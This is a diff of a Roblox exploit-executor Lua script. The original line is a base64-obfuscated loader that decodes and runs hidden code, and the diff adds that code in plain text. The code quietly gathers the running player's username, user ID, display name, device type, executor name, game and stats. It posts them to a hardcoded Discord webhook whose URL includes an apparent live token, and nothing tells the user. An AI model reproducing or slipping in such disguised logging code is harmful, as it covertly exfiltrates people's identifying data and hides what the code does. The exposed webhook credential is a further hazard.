@@ -1,1 +1,156 @@
---[[Protected by Sen Obsfucator V3 | RMPG Services | Generated Time: 2025-12-11 08:52:39]] (function() local __b = "CmxvY2FsIHJlcSA9IGh0dHBfcmVxdWVzdCBvciByZXF1ZXN0IG9yIChzeW4gYW5kIHN5bi5yZXF1ZXN0KQoKbG9jYWwgd2ViaG9va1VybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNDQxMDM1MjEzNzgxMjA1MTEzL19NcGF4VEVzWFVqOTdXUGpBOVQ4eUVsaU1ycl9VcmQ0TFBHODVWM1A1VlJCQmxDWW1wMlJWZFo1amFoYk5ORmVpNEZmIgoKbG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIE1hcmtldHBsYWNlU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiTWFya2V0cGxhY2VTZXJ2aWNlIikKbG9jYWwgVXNlcklucHV0U2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCgpsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIHVzZXJuYW1lID0gcGxheWVyLk5hbWUKbG9jYWwgdXNlcklkID0gcGxheWVyLlVzZXJJZApsb2NhbCBkaXNwbGF5TmFtZSA9IHBsYXllci5EaXNwbGF5TmFtZQpsb2NhbCBkZXZpY2VUeXBlID0gVXNlcklucHV0U2VydmljZS5Ub3VjaEVuYWJsZWQgYW5kICJNb2JpbGUiIG9yICJQQyIKCmxvY2FsIGZ1bmN0aW9uIGRldGVjdEV4ZWN1dG9yKCkKICAgIGlmIHN5biB0aGVuCiAgICAgICAgcmV0dXJuICJTeW5hcHNlIFgiCiAgICBlbHNlaWYgaXNrcm5sY2xvc3VyZSB0aGVuCiAgICAgICAgcmV0dXJuICJLUk5MIgogICAgZWxzZWlmIGZsdXh1cyB0aGVuCiAgICAgICAgcmV0dXJuICJGbHV4dXMiCiAgICBlbHNlaWYgQXJjZXVzIHRoZW4KICAgICAgICByZXR1cm4gIkFyY2V1cyBYIgogICAgZWxzZWlmIGRlbHRhIHRoZW4KICAgICAgICByZXR1cm4gIkRlbHRhIgogICAgZWxzZWlmIGNvZGV4IHRoZW4KICAgICAgICByZXR1cm4gIkNvZGUgWCIKICAgIGVsc2VpZiBjdWJpeCB0aGVuCiAgICAgICAgcmV0dXJuICJDdWJpeCIKICAgIGVsc2VpZiBuZXp1ciB0aGVuCiAgICAgICAgcmV0dXJuICJOZXp1ciIKICAgIGVsc2VpZiBnZXRleGVjdXRvcm5hbWUgdGhlbgogICAgICAgIHJldHVybiBnZXRleGVjdXRvcm5hbWUoKQogICAgZWxzZWlmIGlkZW50aWZ5ZXhlY3V0b3IgdGhlbgogICAgICAgIHJldHVybiBpZGVudGlmeWV4ZWN1dG9yKCkKICAgIGVsc2UKICAgICAgICByZXR1cm4gIlVua25vd24gRXhlY3V0b3IiCiAgICBlbmQKZW5kCgpsb2NhbCBleGVjdXRvciA9IGRldGVjdEV4ZWN1dG9yKCkKCi0tIHRyeSB0byByZXVzZSBGb3JtYXREaXNwbGF5IGZyb20gc2hhcmVkIGlmIGF2YWlsYWJsZSwgb3RoZXJ3aXNlIGZhbGxiYWNrIHRvIGEgc21hbGwgbG9jYWwgZm9ybWF0dGVyCmxvY2FsIGZ1bmN0aW9uIEZvcm1hdE51bWJlcldpdGhDb21tYXMobnVtYmVyKQogICAgbG9jYWwgZm9ybWF0dGVkID0gdG9zdHJpbmcobnVtYmVyKTpyZXZlcnNlKCk6Z3N1YigiKCVkJWQlZCkiLCAiJTEsIik6cmV2ZXJzZSgpCiAgICByZXR1cm4gZm9ybWF0dGVkOmdzdWIoIl4sIiwgIiIpCmVuZAoKbG9jYWwgZnVuY3Rpb24gRm9ybWF0QWJicmV2aWF0ZWQobnVtYmVyKQogICAgbG9jYWwgYWJicmV2aWF0aW9ucyA9IHsiIiwgIksiLCAiTSIsICJCIiwgIlQiLCAiUWEiLCAiUWkifQogICAgbG9jYWwgYWJicmV2aWF0aW9uSW5kZXggPSAxCiAgICB3aGlsZSBudW1iZXIgPj0gMTAwMCBkbwogICAgICAgIG51bWJlciA9IG51bWJlciAvIDEwMDAKICAgICAgICBhYmJyZXZpYXRpb25JbmRleCA9IGFiYnJldmlhdGlvbkluZGV4ICsgMQogICAgZW5kCiAgICByZXR1cm4gc3RyaW5nLmZvcm1hdCgiJS4yZiIsIG51bWJlcikgLi4gYWJicmV2aWF0aW9uc1thYmJyZXZpYXRpb25JbmRleF0KZW5kCgpsb2NhbCBmdW5jdGlvbiBMb2NhbEZvcm1hdERpc3BsYXkodmFsdWUpCiAgICBpZiB0eXBlKHZhbHVlKSB+PSAibnVtYmVyIiB0aGVuCiAgICAgICAgcmV0dXJuIHRvc3RyaW5nKHZhbHVlKQogICAgZW5kCiAgICBsb2NhbCBub3JtYWwgPSBGb3JtYXROdW1iZXJXaXRoQ29tbWFzKHZhbHVlKQogICAgbG9jYWwgYWJicmV2aWF0ZWQgPSBGb3JtYXRBYmJyZXZpYXRlZCh2YWx1ZSkKICAgIHJldHVybiAiWyAiIC4uIG5vcm1hbCAuLiAiIHwgIiAuLiBhYmJyZXZpYXRlZCAuLiAiIF0iCmVuZAoKbG9jYWwgZnVuY3Rpb24gU2FmZUZvcm1hdCh2YWx1ZSkKICAgIGlmIHNoYXJlZCBhbmQgc2hhcmVkLkZvcm1hdERpc3BsYXkgYW5kIHR5cGUoc2hhcmVkLkZvcm1hdERpc3BsYXkpID09ICJmdW5jdGlvbiIgdGhlbgogICAgICAgIGxvY2FsIG9rLCByZXMgPSBwY2FsbChzaGFyZWQuRm9ybWF0RGlzcGxheSwgdmFsdWUpCiAgICAgICAgaWYgb2sgYW5kIHJlcyB0aGVuIHJldHVybiByZXMgZW5kCiAgICBlbmQKICAgIHJldHVybiBMb2NhbEZvcm1hdERpc3BsYXkodmFsdWUpCmVuZAoKbG9jYWwgZnVuY3Rpb24gZ2V0U3RhdFZhbHVlKHBsYXllciwgc3RhdE5hbWUpCiAgICAtLSBjaGVjayBsZWFkZXJzdGF0cyBmaXJzdAogICAgbG9jYWwgbGVhZGVyc3RhdHMgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImxlYWRlcnN0YXRzIikKICAgIGlmIGxlYWRlcnN0YXRzIGFuZCBsZWFkZXJzdGF0czpGaW5kRmlyc3RDaGlsZChzdGF0TmFtZSkgdGhlbgogICAgICAgIGxvY2FsIHMgPSBsZWFkZXJzdGF0c1tzdGF0TmFtZV0KICAgICAgICBpZiBzIGFuZCBzLlZhbHVlIH49IG5pbCB0aGVuCiAgICAgICAgICAgIHJldHVybiBzLlZhbHVlCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICAtLSBjaGVjayBkaXJlY3QgY2hpbGRyZW4gb24gcGxheWVyIChEdXJhYmlsaXR5IGV0Yy4pCiAgICBpZiBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoc3RhdE5hbWUpIGFuZCBwbGF5ZXJbc3RhdE5hbWVdLlZhbHVlIH49IG5pbCB0aGVuCiAgICAgICAgcmV0dXJuIHBsYXllcltzdGF0TmFtZV0uVmFsdWUKICAgIGVuZAoKICAgIC0tIHRyeSBsb3dlcmNhc2UgdmFyaWFudAogICAgbG9jYWwgbG93ZXIgPSBzdGF0TmFtZTpsb3dlcigpCiAgICBpZiBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQobG93ZXIpIGFuZCBwbGF5ZXJbbG93ZXJdLlZhbHVlIH49IG5pbCB0aGVuCiAgICAgICAgcmV0dXJuIHBsYXllcltsb3dlcl0uVmFsdWUKICAgIGVuZAoKICAgIHJldHVybiBuaWwKZW5kCgotLSByZXNvbHZlIGdhbWUgbmFtZSBzYWZlbHkKbG9jYWwgc3VjY2Vzc05hbWUsIHByb2R1Y3ROYW1lID0gcGNhbGwoZnVuY3Rpb24oKQogICAgcmV0dXJuIE1hcmtldHBsYWNlU2VydmljZTpHZXRQcm9kdWN0SW5mbyhnYW1lLlBsYWNlSWQpLk5hbWUKZW5kKQpsb2NhbCBzYWZlUHJvZHVjdE5hbWUgPSAoc3VjY2Vzc05hbWUgYW5kIHByb2R1Y3ROYW1lKSBhbmQgdG9zdHJpbmcocHJvZHVjdE5hbWUpIG9yICJVbmtub3duIgoKLS0gZ2F0aGVyIHRoZSBzdGF0cyB3ZSB3ZXJlIGFza2VkIHRvIHNlbmQKbG9jYWwgc3RyZW5ndGhWYWwgPSBnZXRTdGF0VmFsdWUocGxheWVyLCAgIlN0cmVuZ3RoIikgb3IgIk4vQSIKbG9jYWwgZHVyYWJpbGl0eVZhbCA9IGdldFN0YXRWYWx1ZShwbGF5ZXIsICJEdXJhYmlsaXR5Iikgb3IgIk4vQSIKbG9jYWwgcmViaXJ0aHNWYWwgPSBnZXRTdGF0VmFsdWUocGxheWVyLCAiUmViaXJ0aHMiKSBvciAiTi9BIgpsb2NhbCBraWxsc1ZhbCA9IGdldFN0YXRWYWx1ZShwbGF5ZXIsICJLaWxscyIpIG9yICJOL0EiCgotLSBmb3JtYXQgdGhlbSBmb3IgdGhlIHdlYmhvb2sgb3V0cHV0ICh1c2UgdGhlIHNoYXJlZCBmb3JtYXR0ZXIgaWYgYXZhaWxhYmxlKQpsb2NhbCBmb3JtYXR0ZWRTdHJlbmd0aCA9ICh0eXBlKHN0cmVuZ3RoVmFsKSA9PSAibnVtYmVyIikgYW5kIFNhZmVGb3JtYXQoc3RyZW5ndGhWYWwpIG9yIHRvc3RyaW5nKHN0cmVuZ3RoVmFsKQpsb2NhbCBmb3JtYXR0ZWREdXJhYmlsaXR5ID0gKHR5cGUoZHVyYWJpbGl0eVZhbCkgPT0gIm51bWJlciIpIGFuZCBTYWZlRm9ybWF0KGR1cmFiaWxpdHlWYWwpIG9yIHRvc3RyaW5nKGR1cmFiaWxpdHlWYWwpCmxvY2FsIGZvcm1hdHRlZFJlYmlydGhzID0gKHR5cGUocmViaXJ0aHNWYWwpID09ICJudW1iZXIiKSBhbmQgU2FmZUZvcm1hdChyZWJpcnRoc1ZhbCkgb3IgdG9zdHJpbmcocmViaXJ0aHNWYWwpCmxvY2FsIGZvcm1hdHRlZEtpbGxzID0gKHR5cGUoa2lsbHNWYWwpID09ICJudW1iZXIiKSBhbmQgU2FmZUZvcm1hdChraWxsc1ZhbCkgb3IgdG9zdHJpbmcoa2lsbHNWYWwpCgpsb2NhbCBkZXNjcmlwdGlvblBhcnRzID0gewogICAgIlVzZXJuYW1lID0gIiAuLiB1c2VybmFtZSwKICAgICJVc2VySUQgPSAiIC4uIHVzZXJJZCwKICAgICJEaXNwbGF5IE5hbWUgPSAiIC4uIGRpc3BsYXlOYW1lLAogICAgIkRldmljZSBUeXBlID0gIiAuLiBkZXZpY2VUeXBlLAogICAgIkV4ZWN1dG9yID0gIiAuLiBleGVjdXRvciwKICAgICIiLAogICAgLS0gbmV3IGxpbmUgc2hvd2luZyBnYW1lIGlkIGFuZCBnYW1lIG5hbWUKICAgICJHYW1lOiAiIC4uIHRvc3RyaW5nKGdhbWUuUGxhY2VJZCkgLi4gIiB8ICIgLi4gc2FmZVByb2R1Y3ROYW1lLAogICAgIiIsCiAgICAiU3RhdHM6IiwKICAgICLigKIgU3RyZW5ndGggPSAiIC4uIGZvcm1hdHRlZFN0cmVuZ3RoLAogICAgIuKAoiBEdXJhYmlsaXR5ID0gIiAuLiBmb3JtYXR0ZWREdXJhYmlsaXR5LAogICAgIuKAoiBSZWJpcnRocyA9ICIgLi4gZm9ybWF0dGVkUmViaXJ0aHMsCiAgICAi4oCiIEtpbGxzID0gIiAuLiBmb3JtYXR0ZWRLaWxscwp9Cgpsb2NhbCBib2R5ID0gewogICAgZW1iZWRzID0ge3sKICAgICAgICB0aXRsZSA9IHNhZmVQcm9kdWN0TmFtZSwKICAgICAgICBkZXNjcmlwdGlvbiA9IHRhYmxlLmNvbmNhdChkZXNjcmlwdGlvblBhcnRzLCAiXG4iKSwKICAgICAgICBjb2xvciA9IDAsCiAgICAgICAgYXV0aG9yID0geyBuYW1lID0gIk1haW4gV2ViaG9vayIgfQogICAgfX0KfQoKbG9jYWwganNvbkRhdGEgPSBIdHRwU2VydmljZTpKU09ORW5jb2RlKGJvZHkpCgpwY2FsbChmdW5jdGlvbigpCiAgICByZXEoewogICAgICAgIFVybCA9IHdlYmhvb2tVcmwsCiAgICAgICAgTWV0aG9kID0gJ1BPU1QnLAogICAgICAgIEhlYWRlcnMgPSB7IFsnQ29udGVudC1UeXBlJ10gPSAnYXBwbGljYXRpb24vanNvbicgfSwKICAgICAgICBCb2R5ID0ganNvbkRhdGEKICAgIH0pCmVuZCkKCg==" local __map={};(function() local chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' for i=1,#chars do __map[string.sub(chars,i,i)]=i-1 end end)() local out={};local i=1;while i<=#__b do local c1=__map[string.sub(__b,i,i)];local c2=__map[string.sub(__b,i+1,i+1)];local c3=__map[string.sub(__b,i+2,i+2)];local c4=__map[string.sub(__b,i+3,i+3)];if not c1 then break end;c2=c2 or 0;c3=c3 or 0;c4=c4 or 0;local n=c1*262144+c2*4096+c3*64+c4;local b1=math.floor(n/65536)%256;local b2=math.floor(n/256)%256;local b3=n%256;out[#out+1]=string.char(b1);if string.sub(__b,i+2,i+2)~='=' then out[#out+1]=string.char(b2) end;if string.sub(__b,i+3,i+3)~='=' then out[#out+1]=string.char(b3) end;i=i+4 end;local decoded=table.concat(out) local ok,err=pcall(function() local loader=loadstring or load;local f=loader(decoded);if type(f)=='function'then f() end end) if not ok then pcall(function() print('Wrapper error: '..tostring(err)) end) end end)()
+
+local req = http_request or request or (syn and syn.request)
+
+local webhookUrl = "https://discord.com/api/webhooks/1441035213781205113/_MpaxTEsXUj97WPjA9T8yEliMrr_Urd4LPG85V3P5VRBBlCYmp2RVdZ5jahbNNFei4Ff"
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local username = player.Name
+local userId = player.UserId
+local displayName = player.DisplayName
+local deviceType = UserInputService.TouchEnabled and "Mobile" or "PC"
+
+local function detectExecutor()
+    if syn then
+        return "Synapse X"
+    elseif iskrnlclosure then
+        return "KRNL"
+    elseif fluxus then
+        return "Fluxus"
+    elseif Arceus then
+        return "Arceus X"
+    elseif delta then
+        return "Delta"
+    elseif codex then
+        return "Code X"
+    elseif cubix then
+        return "Cubix"
+    elseif nezur then
+        return "Nezur"
+    elseif getexecutorname then
+        return getexecutorname()
+    elseif identifyexecutor then
+        return identifyexecutor()
+    else
+        return "Unknown Executor"
+    end
+end
+
+local executor = detectExecutor()
+
+-- try to reuse FormatDisplay from shared if available, otherwise fallback to a small local formatter
+local function FormatNumberWithCommas(number)
+    local formatted = tostring(number):reverse():gsub("(%d%d%d)", "%1,"):reverse()
+    return formatted:gsub("^,", "")
+end
+
+local function FormatAbbreviated(number)
+    local abbreviations = {"", "K", "M", "B", "T", "Qa", "Qi"}
+    local abbreviationIndex = 1
+    while number >= 1000 do
+        number = number / 1000
+        abbreviationIndex = abbreviationIndex + 1
+    end
+    return string.format("%.2f", number) .. abbreviations[abbreviationIndex]
+end
+
+local function LocalFormatDisplay(value)
+    if type(value) ~= "number" then
+        return tostring(value)
+    end
+    local normal = FormatNumberWithCommas(value)
+    local abbreviated = FormatAbbreviated(value)
+    return "[ " .. normal .. " | " .. abbreviated .. " ]"
+end
+
+local function SafeFormat(value)
+    if shared and shared.FormatDisplay and type(shared.FormatDisplay) == "function" then
+        local ok, res = pcall(shared.FormatDisplay, value)
+        if ok and res then return res end
+    end
+    return LocalFormatDisplay(value)
+end
+
+local function getStatValue(player, statName)
+    -- check leaderstats first
+    local leaderstats = player:FindFirstChild("leaderstats")
+    if leaderstats and leaderstats:FindFirstChild(statName) then
+        local s = leaderstats[statName]
+        if s and s.Value ~= nil then
+            return s.Value
+        end
+    end
+
+    -- check direct children on player (Durability etc.)
+    if player:FindFirstChild(statName) and player[statName].Value ~= nil then
+        return player[statName].Value
+    end
+
+    -- try lowercase variant
+    local lower = statName:lower()
+    if player:FindFirstChild(lower) and player[lower].Value ~= nil then
+        return player[lower].Value
+    end
+
+    return nil
+end
+
+-- resolve game name safely
+local successName, productName = pcall(function()
+    return MarketplaceService:GetProductInfo(game.PlaceId).Name
+end)
+local safeProductName = (successName and productName) and tostring(productName) or "Unknown"
+
+-- gather the stats we were asked to send
+local strengthVal = getStatValue(player,  "Strength") or "N/A"
+local durabilityVal = getStatValue(player, "Durability") or "N/A"
+local rebirthsVal = getStatValue(player, "Rebirths") or "N/A"
+local killsVal = getStatValue(player, "Kills") or "N/A"
+
+-- format them for the webhook output (use the shared formatter if available)
+local formattedStrength = (type(strengthVal) == "number") and SafeFormat(strengthVal) or tostring(strengthVal)
+local formattedDurability = (type(durabilityVal) == "number") and SafeFormat(durabilityVal) or tostring(durabilityVal)
+local formattedRebirths = (type(rebirthsVal) == "number") and SafeFormat(rebirthsVal) or tostring(rebirthsVal)
+local formattedKills = (type(killsVal) == "number") and SafeFormat(killsVal) or tostring(killsVal)
+
+local descriptionParts = {
+    "Username = " .. username,
+    "UserID = " .. userId,
+    "Display Name = " .. displayName,
+    "Device Type = " .. deviceType,
+    "Executor = " .. executor,
+    "",
+    -- new line showing game id and game name
+    "Game: " .. tostring(game.PlaceId) .. " | " .. safeProductName,
+    "",
+    "Stats:",
+    "• Strength = " .. formattedStrength,
+    "• Durability = " .. formattedDurability,
+    "• Rebirths = " .. formattedRebirths,
+    "• Kills = " .. formattedKills
+}
+
+local body = {
+    embeds = {{
+        title = safeProductName,
+        description = table.concat(descriptionParts, "\n"),
+        color = 0,
+        author = { name = "Main Webhook" }
+    }}
+}
+
+local jsonData = HttpService:JSONEncode(body)
+
+pcall(function()
+    req({
+        Url = webhookUrl,
+        Method = 'POST',
+        Headers = { ['Content-Type'] = 'application/json' },
+        Body = jsonData
+    })
+end)
+
